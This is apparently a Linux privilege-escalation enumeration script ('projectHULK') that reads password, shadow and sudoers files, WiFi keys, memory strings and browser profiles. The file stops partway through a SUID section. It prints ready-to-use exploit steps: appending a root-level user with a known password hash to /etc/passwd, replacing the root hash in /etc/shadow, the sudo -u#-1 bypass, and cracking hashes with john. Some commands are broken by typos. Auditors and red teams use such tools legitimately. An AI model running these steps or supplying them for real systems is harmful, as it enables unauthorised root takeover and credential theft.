#!/bin/bash

#------------------> NOTE:
# If you have redirected the output to a file, please search and delete the following words to have a proper report:
#	\033[0m
#	\033[01;31m
#	\033[0;37;44m
#	\033[01;32;40m

#------------------> Color Code:
RED="\033[01;31m"
BLUE="\033[0;37;44m"
GREEN="\033[01;32;40m"

#------------------> Clear Screen:
echo -e "\n\n${RED}╔════{Clearing Terminal\033[0m"
sleep 0.5
clear 
echo -e "\n\n${GREEN}╔════{Loading Script...\033[0m"
sleep 2
clear

#------------------> Banner:
echo -e "\n"
echo -e "\n"
echo -e "\n\t\t╔════════════════════════════════════════════════════════════════════════════════════════════════╗"
echo -e "\n\t\t║██████╗ ██████╗ █████╗       ██╗███████╗ █████╗ ████████╗      ██╗  ██╗██╗   ██╗██╗     ██╗  ██╗║"
echo -e "\n\t\t║██╔══██╗██╔══██╗██╔══██╗     ██║██╔════╝██╔══██╗╚══██╔══╝      ██║  ██║██║   ██║██║     ██║ ██╔╝║"
echo -e "\n\t\t║██████╔╝██████╔╝██║  ██║     ██║█████╗  ██║  ╚═╝   ██║         ███████║██║   ██║██║     █████═╝ ║"
echo -e "\n\t\t║██╔═══╝ ██╔══██╗██║  ██║██╗  ██║██╔══╝  ██║  ██╗   ██║  █████  ██╔══██║██║   ██║██║     ██╔═██╗ ║"
echo -e "\n\t\t║██║     ██║  ██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝   ██║         ██║  ██║╚██████╔╝███████╗██║ ╚██╗║"
echo -e "\n\t\t║╚═╝     ╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚══════╝ ╚════╝    ╚═╝         ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝║"
echo -e "\n\t\t╚═════════════════════════════════════════════════════════════{${RED}Privilege Escalation Script v2.0\033[0m}═╝"
    sleep 1
echo -e "\n${BLUE}Declaration:\033[0m"
    sleep 0.1
echo -e "\nThe script has been designed to help (SOC/Red Team) or can be used for educational purposes in finding system vulnerabilities that"
echo -e "\nmay lead to privilege escalation & it should be used in safe environment. The author is not responsible for any misuse of it. Therefor,"
echo -e "\nby reading this, you take full responsibility of misusing it."
    sleep 0.1
echo -e "\n${BLUE}Author:\033[0m"
    sleep 0.1
echo -e "\n     Iron Hulk"
echo -e "\nMan In A Black Tuxedo"
    sleep 0.1
echo -e "\n${BLUE}Tweet Me:\033[0m"
    sleep 0.1
echo -e "\nironhulk_x69"
    sleep 0.1
echo -e "\n${BLUE}Message:\033[0m"
    sleep 0.1
echo -e "\nAll the exploits have been listed based on the author's opinion, you may use any of your choice. Rememebr, SKY HAS NO LIMITS :)"
    sleep 0.1
echo -e "\n${BLUE}Recommendation:\033[0m"
    sleep 0.1
echo -e "\nFor a better view of the report is it recommended redirecting the output to a file: ./projectHULK.sh > PE_report.txt"
echo -e "\nNever relay on a single tool, do manual enumeration and try to use many tools as much as you can, here are some good tools:-"
echo -e "\n╚════{ LinEnum: git clone https://github.com/rebootuser/LinEnum.git"
echo -e "\n╚════{ SUID3NUM: git clone https://github.com/Anon-Exploiter/SUID3NUM.git"
echo -e "\n╚════{ LinPeas: git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git"
echo -e "\n╚════{ Linux-Exploit-Suggester: git clone https://github.com/jondonas/linux-exploit-suggester-2.git"
    sleep 0.1
echo -e "\n${BLUE}Send a report:\033[0m"
    sleep 0.1
echo -e "\nIf you are working remotely, you can send the report by one of the following:"
    which wget netcat nc ssh ftp tftp python python2.7 python3 smb
echo -e "\n\tFile Transfer Cheatsheet:"
echo -e "\nhttps://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/ "
    sleep 0.1
echo -e "\n${BLUE}Scan Started At:\033[0m"
echo -e "\n"; date
    sleep 5
echo -e "\n\n${RED}\t\tEnumeration on progress ╔═.......................................(1%)...........................................\033[0m\n\n"
    sleep 5
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ════════════════════════════════════════════════════════════[ Current User Information ]════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] Current user is:\033[0m"
    whoami 2>/dev/null 
echo -e "\n${BLUE}[+] Sudo privileged access:\033[0m"
    sudo -ln
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Incase you have the password, run: sudo -l and find a way to exploit that file║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] User ID:\033[0m"
    id 2>/dev/null 
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc,     ║"
    echo -e "\n  ║Docker, Wheel, Shadow, Disk, Video. Every group worths Googling for exploit.  ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Who's logged in:\033[0m"
    w
echo -e "\n${BLUE}[+] Login History:\033[0m"
    ast -Faiw | last | grep still --color=always
echo -e "\n${BLUE}[+] Last Log In:\033[0m"
    lastlog | grep -v "**Never logged in**" 
echo -e "\n${BLUE}[+] Root Users:\033[0m"
    awk -F: '($3 == '0') {print}' /etc/passwd | grep root --color=always
echo -e "\n${BLUE}[+] Users with console:\033[0m"
    cat /etc/passwd | grep --color=always '/bin/bash\|/bin/sh\|/bin/zsh'
echo -e "\n${BLUE}[+] Total number of users:\033[0m"
    getent passwd | wc -l
echo -e "\n${BLUE}[+] Can we read other users’ history files?\033[0m"
    find /* -name *.*history* -print 2>/dev/null
echo -e "\n${BLUE}[+] Are we in a restricted shell?\033[0m"
    env | grep -i "rbash\|chroot"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Bypass Restricted Shell:                                                              ║"
    echo -e "\n  ║https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] User Group & possible escap:\033[0m"
    id | grep --color=always -i "docker\|lxd\|sambashare\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow" 2>/dev/null
    echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Docker group:                                                                                                    ║"
    echo -e "\n  ║https://gtfobins.github.io/gtfobins/docker/                                                                      ║"
    echo -e "\n  ║https://www.hackingarticles.in/docker-privilege-escalation/                                                      ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║LXD/LXC group:                                                                                                   ║"
    echo -e "\n  ║https://www.hackingarticles.in/lxd-privilege-escalation/                                                         ║"
    echo -e "\n  ║https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/                           ║"
    echo -e "\n  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║Samashare group:                                                                                                 ║"
    echo -e "\n  ║https://www.securityfocus.com/bid/9619/exploit                                                                   ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║lpadmin group:                                                                                                   ║"
    echo -e "\n  ║https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791                                                         ║"
    echo -e "\n  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║"
    echo -e "\n  ║Usually members of the group adm have permissions to read log files located inside /var/log/                     ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║sudo/admin group:                                                                                                ║"
    echo -e "\n  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
    echo -e "\n  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║Video group:                                                                                                     ║"
    echo -e "\n  ║The video group can be used locally to give a set of users access to a video device or to the screen output.     ║"
    echo -e "\n  ║This could be exploited by taking a screenshot of the current screen output and gathering any private information║"
    echo -e "\n  ║such as user passwords or hashes.                                                                                ║"
    echo -e "\n  ║Esc from video:-                                                                                                 ║"
    echo -e "\n  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║"
    echo -e "\n  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
    echo -e "\n  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║Disk group:                                                                                                      ║"
    echo -e "\n  ║The disk group provides users with access to the raw data contained in disks and partitions.                     ║"
    echo -e "\n  ║Esc from disk:-                                                                                                  ║"
    echo -e "\n  ║https://github.com/frizb/Linux-Privilege-Escalation                                                              ║"
    echo -e "\n  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
    echo -e "\n  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║Shadow group:                                                                                                    ║"
    echo -e "\n  ║Since users in this group have access to view the /etc/shadow file, this can be exploited by cracking password   ║"
    echo -e "\n  ║hashes found in it.                                                                                              ║"
    echo -e "\n  ║Esc from shadow:-                                                                                                ║"
    echo -e "\n  ║https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/                                  ║"
    echo -e "\n  ║https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe                          ║"
    echo -e "\n  ║=================================================================================================================║"
    echo -e "\n  ║Adm group:                                                                                                       ║"
    echo -e "\n  ║Usually members of the group adm have permissions to read log files located inside /var/log/. take a look :D     ║"
    echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ══════════════════════════════════════════════════════[ Password File Permission & Users ]══════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] Each field is separated by a colon, and represents a different attribute to the user:\033[0m"
echo -e "\n  ╔════════════════════════════════════════════════════════════════════════════════╗"
echo -e "\n  ║<Username>:<Password>:<UserID>:<GroupID>:<GecosField>:<HomeDirectory>:<Shell>   ║"
echo -e "\n  ║If an -x- is representing the password field, this indicates that the password  ║"
echo -e "\n  ║is encrypted.                                                                   ║"
echo -e "\n  ╚════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Password file:\033[0m"
    ls -la /etc/passwd --color=always
    echo -e "\n  ╔════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If the file has written permission, it can be abused by adding a new user with  ║"
    echo -e "\n  ║root privilege to the file. If it's no't writable, then it's protected.         ║"
    echo -e "\n  ║${RED}Exploite:\033[0m                                                                       ║"
    echo -e "\n  ║${RED}First, generate a password with one of the following commands:\033[0m                  ║"
    echo -e "\n  ║    ${RED}openssl passwd -1 -salt hulk password\033[0m                                       ║"
    echo -e "\n  ║    ${RED}perl -le 'print crypt(hulk, password)'\033[0m                                      ║"
    echo -e "\n  ║${RED}Rewrite the password file:\033[0m                                                      ║"
    echo -e "\n  ║    ${RED}echo 'hulk:HASH:0:0::/root:/bin/bash' >> /etc/passwd\033[0m                        ║"
    echo -e "\n  ║${RED}Then do: su hulk\033[0m                                                                ║"
    echo -e "\n  ║Read more:                                                                      ║"
    echo -e "\n  ║https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/║"
    echo -e "\n  ║Protect the file by limiting the access to it:                                  ║"
    echo -e "\n  ║chmod 600 /etc/passwd                                                           ║"
    echo -e "\n  ╚════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Reading Password File:\033[0m"
    cat /etc/passwd 
echo -e "\n${BLUE}[+] Hash in Password file:\033[0m"
    grep  -v 'x' /etc/passwd
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If any hash is found in the /etc/passwd, the attacker my try to crack it by using  ║"
    echo -e "\n  ║any hash cracker software, tool or website.                                        ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Shadow file:\033[0m"
    ls -la /etc/shadow --color=always
    echo -e "\n  ╔═══════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If the file has read/write permission, it can abuse by replacing the root HASH     ║"
    echo -e "\n  ║with the attacker's HASH or the attacker my copy the hash & try to crack it.       ║"
    echo -e "\n  ║${RED}Exploite:\033[0m                                                                          ║"
    echo -e "\n  ║${RED}1) Generate a new Shadow Hash and replace it with the\033[0m                              ║"
    echo -e "\n  ║   ${RED}current root hash:\033[0m                                                              ║"
    echo -e "\n  ║    ${RED}- mkpasswd  -m sha-512 -S prove123 -s\033[0m                                          ║"
    echo -e "\n  ║${RED}2) Open the shadow file using any text edirot of your choice:\033[0m                      ║"
    echo -e "\n  ║   ${RED}or copy your HASH from your system and replace it with\033[0m                          ║"
    echo -e "\n  ║   ${RED}the root hash\033[0m                                                                   ║"
    echo -e "\n  ║${RED}3) Login to root using your password\033[0m                                               ║"
    echo -e "\n  ║${RED}4) Or Simply do:\033[0m                                                                   ║"
    echo -e "\n  ║${RED}echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/passwd\033[0m             ║"
    echo -e "\n  ║${RED}This adds a root privilege user 'privesc' with the password 'password'\033[0m             ║"
    echo -e "\n  ║Read More:                                                                         ║"
    echo -e "\n  ║https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html ║"
    echo -e "\n  ║Protect the file by limiting the access to it:                                     ║"
    echo -e "\n  ║chmod 600 /etc/shadow                                                              ║"
    echo -e "\n  ╚═══════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Reading shadow File:\033[0m"
    cat /etc/shadow 
echo -e "\n${BLUE}[+] Hash in Shadow file: (Interesting :D)\033[0m"
    grep  -v '*:\|!:' /etc/shadow
    echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Crack the hash using online website or any cracking tools or simply do:                              ║"
    echo -e "\n  ║    unshadow /etc/passwd /etc/shadow > shadow.john                                                   ║"
    echo -e "\n  ║    john shadow.john --wordlist=<WORLD_LIST>                                                         ║"
    echo -e "\n  ║If you own the system and have root, you can use MimiPenguin to crack it:                            ║"
    echo -e "\n  ║    https://github.com/huntergregal/mimipenguin                                                      ║"
    echo -e "\n  ║    https://github.com/sevagas/swap_digger                                                           ║"
    echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Sudoers File:\033[0m"
    ls -la /etc/sudoers --color=always
    echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║<Username> <All terminal>=<All user>:<All Group> <comand to execute>                                 ║"
    echo -e "\n  ║Read more:                                                                                           ║"
    echo -e "\n  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d ║"
    echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Reading Sudoers File:\033[0m"
    cat /etc/sudoers 
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║The file shows a fully detailed about what the current user my run as root. If the running file or the║"
    echo -e "\n  ║application has a global vulnerability, the attacker may google it and abuse it for user escalation.  ║"
    echo -e "\n  ║https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d  ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] User Group list:\033[0m"
    ls -la /etc/group --color=always
echo -e "\n${BLUE}[+] Content of User Group list:\033[0m"
    cat /etc/group 
echo -e "\n${BLUE}[+] Password Policy:\033[0m"
    grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 
echo -e "\n${BLUE}[+] WiFi Creds:\033[0m"
    ls -la /etc/NetworkManager/system-connections
    echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Try to read the following files manually and see if they have any passwords stored inside them.      ║"
    echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Sensitive files:\033[0m"
    ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
    echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║See if any listed files have weak file permission.                                                   ║"
    echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] htpasswd:\033[0m"
    find / -name .htpasswd -print -exec cat {} \; 2>/dev/null 
    echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║It is a flat-file used to store usernames and password. This file is generally used by the web server║"
    echo -e "\n  ║software like Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are║"
    echo -e "\n  ║in ASCII text format. The hash maybe cracked using online tools or any cracking password tools.      ║"
    echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] In memory passwords:\033[0m"
    strings /dev/mem -n10 | grep -i PASS
echo -e "\n${BLUE}[+] Old passwords:\033[0m"
    ls -la /etc/security/opasswd --color=always
echo -e "\n${BLUE}[+] Reading Old passwords:\033[0m"
    cat /etc/security/opasswd
echo -e "\n${BLUE}[+] Root History File:\033[0m"
    s -la /root/.*_history --color=always 2>/dev/null
echo -e "\n${BLUE}[+] Password Files:\033[0m"
    find / -name passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
echo -e "\n${BLUE}[+] apache2.conf:\033[0m"
    cat /etc/apache2/apache2.conf | grep -i "pass\|cred\|hash" --color=always
echo -e "\n${BLUE}[+] smb.conf:\033[0m"
    cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always
echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
echo -e "\n  ║To list all files having the word password/credentials/hash do the following manually:               ║"
    echo -e '\t  ║grep -rn -i "pass\|cred\|hash" / --color=always > password.txt                                       ║'
echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Dump cleartext Pre-Shared Wireless Keys:\033[0m"
    cat /etc/NetworkManager/system-connections/* |grep -i "id\|psk" --color=always
echo -e "\n${BLUE}[+] Configuration files that might contain sensitive information:\033[0m"
    grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
echo -e "\n${BLUE}[+] Firefox credentials:\033[0m"
    ls -la /home/$USER/.mozilla/firefox 2>/dev/null
    echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║You can use firefox_decrypt.py tool found in:                                                        ║"
        echo -e '\t  ║https://github.com/unode/firefox_decrypt                                                             ║'
    echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ═════════════════════════════════════════════════════════════[ System Information ]═════════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] System Name:\033[0m"
    uname -a 2>/dev/null
echo -e "\n  ╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗"
echo -e "\n  ║Useful tools to help you in finding kernel exploite:                                                 ║"
    echo -e '\t  ║https://github.com/spencerdodd/kernelpop                                                             ║'
    echo -e '\t  ║https://github.com/jondonas/linux-exploit-suggester-2                                                ║'
echo -e "\n  ╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] System Release:\033[0m"
    lsb_release -a 2>/dev/null 
echo -e "\n${BLUE}[+] Host name:\033[0m"
    hostname 2>/dev/null 
echo -e "\n${BLUE}[+] System Version:\033[0m"
    cat /proc/version 
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║The version is not listed in our database. However, make sure to keep your    ║"
    echo -e "\n  ║system always up-to-date. Old version are always vulnerable. Visit the link   ║"
    echo -e "\n  ║bellow for more details:                                                      ║"
    echo -e "\n  ║https://github.com/SecWiki/linux-kernel-exploits                              ║"
        echo -e '\t  ║Or use:                                                                       ║'
        echo -e '\t  ║    searchsploit "Linux version"                                              ║'
        echo -e '\t  ║    https://github.com/InteliSecureLabs/Linux_Exploit_Suggester               ║'
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;41mList of vulnerable kernel versions:\033[0m"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║3.9.6 3.9.0 3.9 3.8.9 3.8.8 3.8.7 3.8.6 3.8.5 3.8.4 3.8.3 3.8.2 3.8.1 3.8.0 3.8 3.7.6 3.7.0 3.7 3.6.0 3.6 ║"
    echo -e "\n  ║3.5.0 3.5 3.4.9 3.4.8 3.4.6 3.4.5 3.4.4 3.4.3 3.4.2 3.4.1 3.4.0 3.4 3.3 3.2 3.19.0 3.16.0 3.15 3.14 3.13.1║"
    echo -e "\n  ║3.13.0 3.13 3.12.0 3.12 3.11.0 3.11 3.10.6 3.10.0 3.10 3.1.0 3.0.6 3.0.5 3.0.4 3.0.3 3.0.2 3.0.1 3.0.0    ║"
    echo -e "\n  ║2.6.9 2.6.8 2.6.7 2.6.6 2.6.5 2.6.4 2.6.39 2.6.38 2.6.37 2.6.36 2.6.35 2.6.34 2.6.33 2.6.32 2.6.31 2.6.30 ║"
    echo -e "\n  ║2.6.3 2.6.29 2.6.28 2.6.27 2.6.26 2.6.25 2.6.24.1 2.6.24 2.6.23 2.6.22 2.6.21 2.6.20 2.6.2 2.6.19 2.6.18  ║"
    echo -e "\n  ║2.6.17 2.6.16 2.6.15 2.6.14 2.6.13 2.6.12 2.6.11 2.6.10 2.6.1 2.6.0 2.4.9 2.4.8 2.4.7 2.4.6 2.4.5 2.4.4   ║"
    echo -e "\n  ║2.4.37 2.4.36 2.4.35 2.4.34 2.4.33 2.4.32 2.4.31 2.4.30 2.4.29 2.4.28 2.4.27 2.4.26 2.4.25 2.4.24 2.4.23  ║"
    echo -e "\n  ║2.4.22 2.4.21 2.4.20 2.4.19 2.4.18 2.4.17 2.4.16 2.4.15 2.4.14 2.4.13 2.4.12 2.4.11 2.4.10 2.2.24         ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Sudo Version:\033[0m"
    sudo -V | grep --color=always "Sudo version" 2>/dev/null 
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║The version is not listed in our database. However, make sure to keep your    ║"
    echo -e "\n  ║system always up-to-date. Old version are vulnerable. Use Google for more     ║"
    echo -e "\n  ║details or use:                                                               ║"
        echo -e '\t  ║searchsploit "sudo"                                                           ║'
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Is sudo version vulnerable?\033[0m"
    sudo -V | grep --color=always "Sudo ver" | grep --color=always "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]" 
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If the sudo version <= v1.28, it is exploitable.                              ║"
    echo -e "\n  ║${RED}Exploite:\033[0m                                                                     ║"
    echo -e "\n  ║  ${RED}sudo -u#-1 /bin/bash\033[0m                                                        ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Available shells:\033[0m"
    cat /etc/shells 2>/dev/null
echo -e "\n\033[0;37;44m[+] Bash version:\033[0m"
    bash --version | grep version 2>/dev/null
echo -e "\n\033[0;37;44m[+] Check Bash Shellshock vulnerability:\033[0m"
    env x='() { :;}; echo bash is vulnerable' bash -c 'echo bash is not vulnerable'
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Other test:                                                                                               ║"
    echo -e "\n  ║https://serverfault.com/questions/631257/how-to-test-if-my-server-is-vulnerable-to-the-shellshock-bug     ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Path Environment:\033[0m"
    systemctl show-environment 2>/dev/null 
echo -e "\n${BLUE}[+] System Path:\033[0m"
    path_path= echo $PATH 
    echo -e "$path_path"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║If you have write permissions on any folder inside the PATH variable you may be able to hijack║"
    echo -e "\n  ║some libraries or binaries. Read more:                                                        ║"
    echo -e "\n  ║https://resources.infosecinstitute.com/topic/vulnhub-machines-walkthrough-series-pwnlab-init/ ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Lists block devices (hardrives, memory cards, etc):\033[0m"
    lsblk -a 
echo -e "\n${BLUE}[+] Lists USB devices:\033[0m"
    lsusb 
echo -e "\n${BLUE}[+] Information about SATA Devices for /dev/sda1:\033[0m"
    hdparm /dev/sda1 2>/dev/null 
echo -e "\n${BLUE}[+] Linux File System Information:\033[0m"
    fdisk -l 2>/dev/null 
echo -e "\n${BLUE}[+] List of running services:\033[0m"
    service --status-all 
echo -e "\n${BLUE}[+] File-systems mounted:\033[0m"
    df -h 2>/dev/null
echo -e "\n${BLUE}[+] ASLR Settings:\033[0m"
    cat /proc/sys/kernel/randomize_va_space
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Valid Settings:                                                                               ║"
    echo -e "\n  ║0 = Disablabed                                                                                ║"
    echo -e "\n  ║1 = Conservative Randomization                                                                ║"
    echo -e "\n  ║2 = Full Randomization                                                                        ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] ASLR Address Space:\033[0m"
    ldd /bin/bash
echo -e "\n${BLUE}[+] SELinux status:\033[0m"
    sestatus 2>/dev/null
echo -e "\n\n${RED}\t\tEnumeration on progress ╔══════════════════......................(20%)..........................................\033[0m\n\n"
    sleep 5
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ══════════════════════════════════════════════════════════════[ System Date/Time ]══════════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] System Up Time:\033[0m"
    uptime | sed -E 's/^[^,]*up *//; s/, *[[:digit:]]* users.*//; s/min/minutes/; s/([[:digit:]]+):0?([[:digit:]]+)/\1 hours, \2 minutes/'
echo -e "\n${BLUE}[+] System Date:\033[0m"
    date 2>/dev/null 
echo -e "\n${BLUE}[+] CPU Information:\033[0m"
    lscpu 2>/dev/null 
echo -e "\n${BLUE}[+] System Timer List:\033[0m"
    systemctl list-timers --all 2>/dev/null 
echo -e "\n"
echo -e "\n${RED} ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m"
echo -e "\n${RED}  ════════════════════════════════════════════════════════════════[ System SUID ]═════════════════════════════════════════════════════════════════ \033[0m"
echo -e "\n${RED} ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m"
echo -e "\n"
    sleep 1
echo -e "\n${BLUE}[+] What is SUID/GUID?\033[0m"
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║SUID (Set User ID) and SGIDs (Set Group ID) executables are those that execute║"
    echo -e "\n  ║with the permission of the owner (SUID) or group (SGID). You can identify SUID║"
    echo -e "\n  ║and SGIDs by a representative 's' in the execute permission field the file:   ║"
    echo -e "\n  ║-rwsr-sr-x can often be exploited to gain root privilege.                     ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Find capability files:\033[0m"
    getcap -r / 2>/dev/null
    echo -e "\n  ╔══════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\n  ║Capability files are different from system to another system. Googling them my║"
    echo -e "\n  ║revile a way of how to exploit them.                                          ║"
    echo -e "\n  ╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}[+] Capability with setui+ep:\033[0m"
    getcap -r / 2>/dev/null | grep cap_setuid+ep
echo -e "\n${BLUE}[+] Built-in Binaries:\033[0m"
		echo -e "\t  /usr/sbin/pppd                    |  /usr/sbin/exim4"
